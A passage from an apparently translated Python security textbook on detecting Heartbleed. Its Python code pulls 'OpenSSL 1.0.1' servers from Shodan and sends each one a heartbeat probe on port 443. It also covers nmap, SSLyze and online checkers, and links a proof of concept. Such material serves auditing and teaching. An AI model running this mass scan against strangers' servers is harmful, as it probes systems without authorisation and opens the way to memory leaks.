要在启用了 openssl 的服务器中检测此漏洞，我们发送一个特定请求，如果响应服务器等于特定的 heartbleed 有效负载，则服务器是易受攻击的，您可以访问理论上应该受 SSL 保护的信息。

服务器的响应包括存储在进程内存中的信息。除了是一个影响许多服务的严重漏洞外，检测易受攻击的目标然后定期从服务器内存中提取块是非常容易的。

我们可以将 shodan 搜索与检查服务器的心脏出血漏洞结合起来。

为此任务，我们已经定义了`shodanSearchVulnerable()`和`checkVulnerability()`方法，用于检查与“OpenSSL 1.0.1”Shodan 搜索匹配的每个服务器的易受攻击性。

对于 python 2.x，您可以在`heartbleed_shodan`文件夹中的`testShodan_openssl_python2.py`中找到代码。

对于 python 3.x，您可以在`heartbleed_shodan`文件夹中的`testShodan_openssl_python3.py`中找到代码。

在以下代码中，我们回顾了我们可以开发的用于搜索易受 openssl 版本易受攻击的 shodan 服务器的主要方法，还需要检查端口 443 是否打开：

```py
def shodanSearchVulnerable(self,query):
    results = self.shodanApi.search(query)
    # Show the results
    print('Results found: %s' % results['total'])
    print('-------------------------------------')
    for result in results['matches']:
        try:
            print('IP: %s' % result['ip_str'])
            print(result['data'])
            host = self.obtain_host_info(result['ip_str'])
            portArray = []
            for i in host['data']:
                port = str(i['port'])
                portArray.append(port)
            print('Checking port 443........................')
            #check heartbeat vulnerability in port 443
            checkVulnerability(result['ip_str'],'443')
        except Exception as e:
            print('Error connecting: %s' % e)
            continue
        except socket.timeout:
            print('Error connecting Timeout error: %s' % e)
            continue

    print('-----------------------------------------------')
    print('Final Results')
    print('-----------------------------------------------')
    if len(server_vulnerable) == 0:
        print('No Server vulnerable found')
    if len(server_vulnerable) > 0:
        print('Server vulnerable found ' + str(len(server_vulnerable)))

    for server in server_vulnerable:
        print('Server vulnerable: '+ server)
        print(self.obtain_host_info(server))
```

一旦我们定义了在 shodan 中搜索的方法并检查了`端口 443`是否打开，我们可以使用`socket`模块检查特定的心脏出血漏洞：

```py
def checkVulnerability(ip,port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print('Connecting with ...' + ip + ' Port: '+ port)
        sys.stdout.flush()
        s.connect((ip, int(port)))
        print('Sending Client Request...')
        sys.stdout.flush()
        s.send(hello)
        print('Waiting for Server Request...')
        sys.stdout.flush()
        while True:
            typ, ver, pay = recvmsg(s)
            if typ == None:
                print('Server closed connection without sending Server Request.')
                break
            # Look for server hello done message.
            if typ == 22 and ord(pay[0]) == 0x0E:
                break
            print('Sending heartbeat request...')
            sys.stdout.flush()
            s.send(hb)
            if hit_hb(s):
                server_vulnerable.append(ip)
    except socket.timeout:
        print("TimeOut error")
```

# 用于测试 openssl 易受攻击性的其他工具

在本节中，我们介绍了一些可以用于测试与心脏出血和证书相关的 openssl 漏洞的工具。

# 心脏出血-大规模测试

这个工具允许我们以多线程的高效方式扫描多个主机的心脏出血。这个测试 OpenSSL 版本易受心脏出血漏洞的服务器，而不是利用服务器，因此心跳请求不会导致服务器泄漏内存中的任何数据或以未经授权的方式暴露任何数据：[`github.com/musalbas/heartbleed-masstest`](https://github.com/musalbas/heartbleed-masstest)。

# 使用 nmap 端口扫描程序扫描心脏出血

Nmap 有一个 Heartbleed 脚本，可以很好地检测易受攻击的服务器。该脚本可在 OpenSSL-Heartbleed nmap 脚本页面上找到：

[`nmap.org/nsedoc/scripts/ssl-heartbleed.html`](http://nmap.org/nsedoc/scripts/ssl-heartbleed.html)

[`svn.nmap.org/nmap/scripts/ssl-heartbleed.nse`](https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nse)

在 Windows 操作系统中，默认情况下，脚本位于`C:\Program Files (x86)\Nmap\scripts`路径中。

在 Linux 操作系统中，默认情况下，脚本位于`/usr/share/nmap/scripts/`路径中。

```py
nmap -p 443 —script ssl-heartbleed [IP Address]
```

我们所需要做的就是使用 Heartbleed 脚本并添加目标站点的 IP 地址。如果我们正在分析的目标易受攻击，我们将看到这个：

![](img/081c95cd-444d-4a99-9d54-c3548dd4c947.png)

# 使用 SSLyze 脚本分析 SSL/TLS 配置

SSLyze 是一个使用 python 3.6 工作的 Python 工具，用于分析服务器的 SSL 配置，以检测诸如不良证书和危险密码套件之类的问题。

这个工具可以在`pypi`存储库中找到，您可以从源代码或使用 pip install 命令进行安装：

[`pypi.org/project/SSLyze/`](https://pypi.org/project/SSLyze/)

[`github.com/nabla-c0d3/sslyze`](https://github.com/nabla-c0d3/sslyze)

还需要安装一些依赖项，例如`nassl`，也可以在 pypi 存储库中找到：

[`pypi.org/project/nassl/`](https://pypi.org/project/nassl/)

[`github.com/nabla-c0d3/nassl`](https://github.com/nabla-c0d3/nassl)

这些是脚本提供的选项：

![](img/7ab6fc9d-d479-4a73-9feb-bae03b64836e.png)

它提供的选项之一是用于检测此漏洞的 HeartbleedPlugin：

![](img/edecd339-9f8c-4ca7-a9fb-08dc01296eb5.png)

它还提供了另一个用于检测服务器正在使用的 OpenSSL 密码套件的插件：

![](img/2d99e43d-c5e8-480a-99a4-ab36aaf2e692.png)

如果我们尝试在特定 IP 地址上执行脚本，它将返回一个带有结果的报告：

![](img/8f701679-aa3f-46b4-81d0-ea7ae14db25a.png)

此分析的执行结果可在 GitHub 存储库中的`sslyze_72.249.130.4.txt`共享文件中找到。

# 其他服务

有几个在线服务可以帮助您确定服务器是否受到此漏洞的影响，还有其他用于测试服务器和域中的 ssl 版本和证书的服务，例如 ssllabs fror qualys。

在这些链接中，我们可以找到一些进行此类测试的服务：

+   [`filippo.io/Heartbleed`](https://filippo.io/Heartbleed)

+   [`www.ssllabs.com/ssltest/index.html`](https://www.ssllabs.com/ssltest/index.html)

qualys 在线服务以**报告**的形式返回结果，其中我们可以看到服务器正在使用的 openssl 版本可能存在的问题：

![](img/dfa631a6-0027-4e19-bc8b-a3c7138ff7cf.png)

我们还可以详细了解 SSL/TLS 版本和有关可能漏洞的信息：

![](img/30fabd61-e4eb-4fdd-9765-37ecdb4f8844.png)

使用 Shodan 服务，您可以查看与服务器和 SSL 证书中检测到的 CVE 漏洞相关的更多信息。

在此截图中，我们可以看到与服务器中的配置问题相关的其他 CVE：

![](img/f1769398-c548-456c-956a-4468ff4aced7.png)

# 总结

目前，对 Web 应用程序中的漏洞进行分析是执行安全审计的最佳领域。本章的目标之一是了解 Python 生态系统中的工具，这些工具可以帮助我们识别 Web 应用程序中的服务器漏洞，例如 w3af 和 sqlmap。在 SQL 注入部分，我们涵盖了 SQL 注入和使用 sqlmap 和 xssscrapy 检测此类漏洞的工具。此外，我们还研究了如何检测与服务器中的 OpenSSL 相关的漏洞。

在下一章中，我们将探讨用于提取有关地理位置 IP 地址的信息、提取图像和文档的元数据以及识别网站前端和后端使用的 Web 技术的编程包和 Python 模块。

# 问题

1.  以下哪项是一种攻击，将恶意脚本注入到网页中，以将用户重定向到假网站或收集个人信息？

1.  攻击者将 SQL 数据库命令插入到 Web 应用程序使用的订单表单的数据输入字段中的技术是什么？

1.  有哪些工具可以检测与 JavaScript 相关的 Web 应用程序中的漏洞？

1.  有什么工具可以从网站获取数据结构？

1.  有什么工具可以检测 Web 应用程序中与 SQL 注入类型漏洞相关的漏洞？

1.  w3af 工具中的哪个配置文件执行扫描以识别更高风险的漏洞，如 SQL 注入和跨站脚本（XSS）？

1.  w3af API 中的主要类包含启用插件、确定攻击目标和管理配置文件所需的所有方法和属性是什么？

1.  slmap 选项是列出所有可用数据库的选项吗？

1.  nmap 脚本的名称是什么，可以让我们在服务器中扫描 Heartbleed 漏洞？

1.  建立 SSL 连接的过程是什么，包括对称和非对称密钥的交换，以建立客户端和服务器之间的加密连接？

# 进一步阅读

在以下链接中，您将找到有关本章中提到的工具的更多信息：

+   [`www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/`](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

+   [`blog.sqreen.io/preventing-sql-injections-in-python/`](https://blog.sqreen.io/preventing-sql-injections-in-python/)

+   [`hackertarget.com/sqlmaptutorial`](https://hackertarget.com/sqlmaptutorial)

+   [`packetstormsecurity.com/files/tags/python`](https://packetstormsecurity.com/files/tags/python)

+   [`packetstormsecurity.com/files/90362/Simple-Log-File-Analyzer 1.0.html`](https://packetstormsecurity.com/files/90362/Simple-Log-File-Analyzer%201.0.html)

+   [`github.com/mpgn/heartbleed-PoC`](https://github.com/mpgn/heartbleed-PoC)
